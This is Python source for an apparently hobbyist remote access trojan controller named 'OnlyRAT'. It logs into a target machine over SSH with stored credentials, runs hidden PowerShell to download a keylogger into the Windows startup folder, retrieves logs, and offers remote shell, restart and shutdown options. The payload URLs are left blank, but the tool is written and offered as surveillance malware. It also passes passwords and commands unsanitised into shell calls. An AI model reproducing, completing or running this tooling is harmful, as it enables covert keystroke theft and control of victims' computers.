import os
import sys
import getpass
import random as r
from datetime import datetime

banner = """
|\  \|\  \|\   __  \|\   ____\|\  \|\  \ |\  ___ \ |\   __  \    
\ \  \\\  \ \  \|\  \ \  \___|\ \  \/  /|\ \   __/|\ \  \|\  \   
 \ \   __  \ \   __  \ \  \    \ \   ___  \ \  \_|/_\ \   _  _\  
  \ \  \ \  \ \  \ \  \ \  \____\ \  \\ \  \ \  \_|\ \ \  \\  \| 
   \ \__\ \__\ \__\ \__\ \_______\ \__\\ \__\ \_______\ \__\\ _\ 
    \|__|\|__|\|__|\|__|\|_______|\|__| \|__|\|_______|\|__|\|__|
"""

help_menu = """
        [+] Arguments:
            <username>.rat ------------ Access Target Via Config File
            -d, --dfig <vps_user> ----- Download RAT Config File 
            -s, --start --------------- Start Tool
            -m, --man ----------------- OnlyRAT Manual
            -v, --version ------------- OnlyRAT Version
            -u, --update -------------- Update OnlyRAT
            -r, --remove -------------- Uninstall OnlyRAT
            -h, --help  --------------- Help Menu

        [+] Example:
            onlyrat bluecosmo.rat
"""

options_menu = """
 [+] Command and Control:
            [0] -------------- Connect Command Line 
            [1] ---------- Install Keylogger
            [2] ----------------- Take File KeyLogger
            [3] --------------- Install ScreenShot (.jpg)
            [4] --- Take image 
            [5] -- Sets Connection to Remote
            [6] ---------------- Restart Target PC
            [7] --------------- Shutdown Target PC
            [8] ------------- Removes OnlyRAT From Target

        [+] Payloads:
            Coming Soon...

        [+] Options:
            [help] ------------------- Help Menu
            [man] -------------------- Onlyrat Manual
            [config] ----------------- Display RAT File
            [version] ---------------- Version Number
            [update] ----------------- Update OnlyRAT
            [uninstall] -------------- Uninstall OnlyRAT
            [quit] ------------------- Quit

            * any other commands will be 
              sent through your terminal

        [*] Select an [option]...
"""
username = getpass.getuser()
header = f"[~] {username}@toolhacking $:"

    
def run_command(address, username, password, command):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '{command}'")
    
def keylogger(address, username, password, temp, startup):
    print("[*] Starting install keylogger ...")
    control = f"powershell -c powershell.exe -WindowStyle hidden 'Invoke-WebRequest -Uri  -OutFile {startup}/system.cmd'"
    payload = f"powershell -c powershell.exe -WindowStyle hidden 'Invoke-WebRequest -Uri  -OutFile {temp}/system.ps1'"

    print("[*] Installing control keylogger")
    run_command(address, username, password, control)
    print("[*] Installing keylogger")
    run_command(address, username, password, payload)
    print("[*] Install successful : Let restart device to run keylogger !!!")

def take_file_log(address, username, password, path):
    os.system(f"sshpass -p \"{password}\" scp {username}.rat {username}@{address}:{path}")

def terminated():
    return

def read_config_file(config_file):
    config_json = {}
    read_file = open(config_file, "r").readlines()
    
    config_json["IPADDRESS"] = read_file[0]
    config_json["USERNAME"] = read_file[1]
    config_json["PASSWORD"] = read_file[2]
    config_json["WOKING_TEMP"] = read_file[3]
    config_json["WOKING_STARTUP"] = read_file[4]

    return config_json

def os_detection(address, username, password):
    os_name = os.system(f"sshpass -p \"{password}\" ssh {username}@{address} '(Get-WmiObject Win32_OperatingSystem).Caption'")
    return os_name

def connect(address, username, password):
    os.system(f"sshpass -p \"{password}\" ssh {username}@{address}")
    

def cli(args): 
    print(banner)
    
    if args.endswith(".rat"):
        config_json = read_config_file(args)
        IPADDRESS = config_json["IPADDRESS"]
        PASSWORD = config_json["PASSWORD"]
        USERNAME = config_json['USERNAME']
        TEMP = config_json["WOKING_TEMP"]
        STARTUP = config_json["WOKING_STARTUP"]
        while(True):
            options = input(f"{header}")
            if options == "help":
                print(help_menu)
            elif options == "exit":
                terminated()
            elif options == "0":
                connect(IPADDRESS, USERNAME, PASSWORD)
            elif options == "1":
                keylogger(IPADDRESS, USERNAME, PASSWORD, TEMP, STARTUP)
            elif options == "2":
                take_file_log(IPADDRESS, USERNAME,PASSWORD, TEMP)
    elif args in ["-h", "-help"]:
        print(help_menu)
        
        
def main():
    try:
        sys.argv[1]
    except IndexError:
        print(help_menu)
    else:
        cli(sys.argv[1])
if __name__ == "__main__":
    main()
